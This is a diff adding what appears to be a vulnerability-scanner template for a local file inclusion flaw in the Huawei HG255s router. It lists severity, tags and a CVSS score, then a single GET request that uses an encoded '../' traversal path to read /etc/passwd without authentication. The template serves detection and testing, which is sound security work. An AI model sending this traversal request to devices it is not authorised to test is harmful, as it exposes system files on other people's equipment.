@@ -1,0 +1,20 @@
+id: huawei-hg255s-lfi
+brief:
+    title: Huawei HG255s - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: Huawei HG255s is vulnerable to local file inclusion due to insufficient validation of the received HTTP requests. A remote attacker may access the local files on the device without authentication.
+    label:
+        - huawei
+        - lfi
+        - router
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
